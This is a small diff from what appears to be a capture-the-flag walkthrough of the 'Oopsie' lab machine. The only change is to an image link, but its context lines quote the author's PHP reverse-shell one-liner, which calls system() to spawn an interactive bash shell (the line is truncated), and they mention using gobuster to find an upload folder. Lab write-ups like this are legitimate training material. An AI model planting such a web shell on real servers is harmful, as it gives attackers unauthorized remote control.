@@ -35,7 +35,7 @@ Here is my PHP reverse shell that i use : ```<?php system("bash -c 'bash -i >& /
 
 Can't find any subdirectory of "upload" so I use **gobuster** :
 
-![gobuster|601](/assets/img/Oopsie/gobuster.png)
+![gobuster](/assets/img/Oopsie/gobuster.png)
 
 and that actually found an exact url to uploaded folder. 
 
